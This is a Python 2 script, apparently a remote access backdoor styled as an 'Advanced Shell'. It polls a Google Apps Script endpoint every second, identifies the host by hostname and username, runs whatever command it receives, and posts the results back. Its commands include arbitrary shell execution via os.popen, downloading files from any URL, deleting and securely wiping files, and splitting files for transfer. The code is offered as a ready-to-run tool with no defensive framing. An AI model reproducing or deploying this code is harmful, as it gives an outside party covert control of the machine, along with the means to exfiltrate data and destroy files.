import requests, socket, urllib, time, os, json, getpass, shutil, urllib2
import compressor, explit, wipe

def cd(path):
    return os.chdir(path)

def rm(path):
    if os.path.isfile(path):
        return os.remove(path)
    else:
        return shutil.rmtree(path)

def wp(path):
    if os.path.isfile(path):
        return wipe.recursiveWipe(path)
    else:
        return wipe.wipeDirectory(path)

def md(path):
    os.makedirs(path)

def download(url, target):
    open(target, 'wb').write(urllib2.urlopen(url).read())
    return "OK"

def other(cmd):
    output = os.popen(cmd).read()
    return output

def execute(command):
    if command.startswith("cd "):
        cd(command[3:])
    elif command.startswith("rm "):
        rm(command[3:])
    elif command.startswith("wipe "):
        wp(command[5:])
    elif command.startswith("md "):
        md(command[3:])
    elif command.startswith("download "):
        url = command.find(' ') + 1
        path = command.rfind(' ')+1
        return download(command[url:path], command[path:])
    elif command.startswith("split "):
        filename = command[command.find(' ') + 1:]
        if os.path.isfile(filename):
            explit.split(filename, filename + "_split")
            return 'output: ' + filename + "_split"
        elif os.path.exists(filename):
            compressor.zipDirectory(filename)
            explit.split(filename + '.zip', filename + ".zip_split")
            return 'split output: ' + filename + ".zip_split"
    elif command.startswith("merge "):
        directory = command[command.find(' ') + 1:]
        filename = directory.replace("_split", "")
        explit.merge(directory, filename)
        if filename.endswith(".zip"):
            compressor.unzipDirectory(filename)
        return 'merge output: ' + filename.replace(".zip","")
    elif command.startswith("zip "):
        filename = command[command.find(' ') + 1:]
        return compressor.zipDirectory(filename)
    elif command.startswith("unzip "):
        filename = command[command.find(' ') + 1:]
        return compressor.unzipDirectory(filename)
    elif command == "help":
        return """
                Advanced Shell
                Version 1.0
                Authored by VJ

                Functions:
                rm (foldername/filename)
                wipe (foldername/filename)
                split (foldername/filename)
                merge (foldername)
                download (url) (save path)
                all other shell functions

                Note: actions you take can be destructive
                and should be taken by extreme care
              """
    else:
        return other(command)

api = "https://script.google.com/macros/s/AKfycbyPi4Wsk2R5GKBRcla-rWkb-yMAszIO54ZnRez_gONYcE2PhgE/exec"
name = str(socket.gethostname()).strip() + "." + getpass.getuser()
last = ""
while True:
    try:
        cmd = requests.get(api, params={"computer":name}).json()[u'command']
        if (last != cmd):
            result = execute(cmd)
            print result
            last=cmd
            response = {'method':'report', 'computer':name, 'result':result}
            requests.post(api, data=response)
    except:
        print "err"
        pass
    
    time.sleep(1)
